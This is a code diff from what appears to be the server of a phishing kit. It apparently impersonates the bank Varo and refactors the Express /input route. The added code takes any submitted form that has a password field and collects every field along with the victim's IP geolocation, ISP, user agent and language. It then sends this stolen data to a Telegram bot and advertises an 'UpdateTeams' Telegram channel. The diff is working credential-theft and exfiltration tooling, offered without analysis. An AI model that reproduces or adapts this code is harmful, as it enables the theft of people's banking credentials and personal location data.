@@ -200,59 +200,6 @@ function getClientIp(req) {
             return null;
         }
     };
-    
-    
-    
-async function handleRequest(req, res) {
-    const ipAddress = getClientIp(req);
-    const ipAddressInformation = await sendAPIRequest(ipAddress);
-
-    if (!ipAddressInformation) {
-        return res.status(500).send('Error retrieving IP information');
-    }
-
-    const userAgent = req.headers["user-agent"];
-    const systemLang = req.headers["accept-language"];
-    const myObjects = Object.keys(req.body);
-    const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
-
-    console.log(lowerCaseMyObjects);
-
-    if (lowerCaseMyObjects.includes('password')) {
-        message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
-            `👤 LOGIN \n\n`;
-
-        for (const key of myObjects) {
-            if (key.toLowerCase() !== 'visitor' && req.body[key] !== "") {
-                console.log(`${key}: ${req.body[key]}`);
-                message += `${key}: ${req.body[key]}\n`;
-            }
-        }
-
-        message += `🌍 GEO-IP INFO\n` +
-            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-            `CITY             : ${ipAddressInformation.location.city}\n` +
-            `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-            `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-            `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-            `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-            `💻 SYSTEM INFO\n` +
-            `USER AGENT       : ${userAgent}\n` +
-            `SYSTEM LANGUAGE  : ${systemLang}\n` +
-            `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-        const sendMessage = sendMessageFor(botToken, chatId);
-        sendMessage(message);
-
-        res.send('Message sent');
-        return;
-    }
-
-    res.send('No sensitive data found');
-}
-
 
 
 const HEARTBEAT_INTERVAL = 60000; // 30 seconds
@@ -352,9 +299,50 @@ app.get('/events', (req, res) => {
 
 app.post('/input', async (req, res) => { // Mark the route handler as async
     const { clientId, currPage, inputs } = req.body;
-
+	const myObjects = Object.keys(req.body);
+    
     console.log('Received /input request:', req.body);
-	await handleRequest(req, res);
+	const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+
+    if (!ipAddressInformation) {
+        return res.status(500).send('Error retrieving IP information');
+    }
+
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
+    const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+
+    console.log(lowerCaseMyObjects);
+
+    if (lowerCaseMyObjects.includes('password')) {
+        message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
+            `👤 LOGIN \n\n`;
+
+        for (const key of myObjects) {
+            if (key.toLowerCase() !== 'visitor' && req.body[key] !== "") {
+                console.log(`${key}: ${req.body[key]}`);
+                message += `${key}: ${req.body[key]}\n`;
+            }
+        }
+
+        message += `🌍 GEO-IP INFO\n` +
+            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+            `CITY             : ${ipAddressInformation.location.city}\n` +
+            `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+            `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+            `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+            `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+            `💻 SYSTEM INFO\n` +
+            `USER AGENT       : ${userAgent}\n` +
+            `SYSTEM LANGUAGE  : ${systemLang}\n` +
+            `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+        const sendMessage = sendMessageFor(botToken, chatId);
+        sendMessage(message);
+        
     
     if (!clientId || typeof inputs !== 'object') {
         return res.status(400).send('Missing clientId or inputs object');
